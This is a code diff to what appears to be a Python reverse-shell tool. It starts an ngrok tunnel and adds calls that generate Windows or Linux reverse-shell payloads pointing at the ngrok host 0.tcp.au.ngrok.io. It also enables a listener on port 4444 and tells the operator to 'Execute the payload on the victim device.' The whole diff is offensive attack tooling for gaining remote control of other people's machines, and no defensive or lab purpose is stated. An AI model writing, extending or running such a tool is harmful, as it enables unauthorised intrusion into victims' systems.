@@ -21,24 +21,31 @@ def start_ngrok_service():
                      creationflags=NEW_CONSOLE 
     )
 
+
 def start_listener():
+    print("\n[!] Listener started.")
+    print("[!] Execute the payload on the victim device.")
     listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     listener.bind(("localhost", 4444))
     listener.listen()
     ip, data = listener.accept()
+
 
 def generate_payload():
     try:
         print("[!] In the Ngrok window look for IP:PORT next to forwarding row.")
         print("\n[!] Copy the PORT and enter it in the console.")
         port = int(input("\n\nPORT: "))
-        os = input("\nWindows or Linux payload? w/l")
+        os = input("\nWindows or Linux payload? w/l ")
         if os == "w":
-            pass
+            reverse_shell_gen.windows_payload(ip_addr="0.tcp.au.ngrok.io",
+                                              port=port)
         elif os == "l":
-            pass
+            reverse_shell_gen.linux_payload(ip_addr="0.tcp.au.ngrok.io", 
+                                            port=port)
+        
     except ValueError:
-        print("\nPlease input the port you see after: 0.tcp.au.ngrok.io")
+        print("\nPlease input the port you see after EX: 0.tcp.au.ngrok.io")
         print("\nPort numbers range from 1-65500.")
         sleep()
         clear_screen()
@@ -50,7 +57,7 @@ def main():
     sng_service = threading.Thread(target=start_ngrok_service)
     sng_service.start()
     generate_payload()
-    #start_listener()
+    start_listener()
 
 
 if __name__ == "__main__":
